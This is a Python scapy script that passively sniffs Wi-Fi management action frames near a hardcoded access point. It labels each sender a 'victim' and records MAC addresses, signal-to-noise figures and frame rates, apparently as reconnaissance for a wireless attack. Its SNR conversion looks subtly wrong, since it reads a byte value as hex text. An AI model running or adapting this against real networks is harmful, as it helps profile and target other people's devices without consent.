from scapy.all import *
from scapy.layers.dot11 import Dot11    
# 定义目标MAC地址
target_mac = "90:DE:80:F1:4A:B2"
ap_mac = "A4:A9:30:95:22:5B"
action_pkt=[]
ndp_pkt=[]
victim_mac_list=[]
stop_sniffing=False
def hex_to_six_bit_complement(hex_str):
    # 1. 将16进制字符转换为二进制字符串，去掉'0b'前缀，并填充到16位
    binary_str = bin(int(hex_str, 16))[2:].zfill(16)
    
    # 2. 提取前6位
    six_bit_str = binary_str[:6]
    suffix_bit = binary_str[6:8]
    # 3. 转换为十进制（处理补码）
    if six_bit_str[0] == '1':  # 如果首位是1，表示负数
        decimal_value = int(six_bit_str, 2) - 2**6
    else:  # 否则表示正数
        decimal_value = int(six_bit_str, 2)
    decimal_value=22+decimal_value+int(suffix_bit,2)*0.25
    return decimal_value
# 定义嗅探回调函数
def sniff_packet(packet):
    # 只处理管理帧
    global victim_mac_list
    if packet.haslayer(Dot11) and packet.type==0 and packet.subtype==14:
        global action_pkt
        action_pkt.append(packet)
        if packet.addr2 not in victim_mac_list:
            victim_mac_list.append(packet.addr2)
        print(f"Capture one Action Frame: {packet.summary()}")
        print(f"Victim's SNR to AP: {hex_to_six_bit_complement(str(packet.load[5]))} dB")
        print(f"Victim's SNR to Attacker: {packet.dBm_AntSignal} dBm")
        print(f"Victim's Address: {packet.addr2}")
        print(f"Victim's Action Frame's Rate: {packet.Rate}")
# 定义停止条件函数
def stop_filter(packet):
    return stop_sniffing
# 开始嗅探
pkt=sniff(iface="wlp88s0", prn=sniff_packet,timeout=10)

victim_num=len(victim_mac_list)
print("********************************************************")
print(f"Found {victim_num} potential victims.")
for mac_add in victim_mac_list:
    print(f"Victim's MAC address is: {mac_add}.")
    print(f"AP's MAC address is: {ap_mac}.")
print("********************************************************")
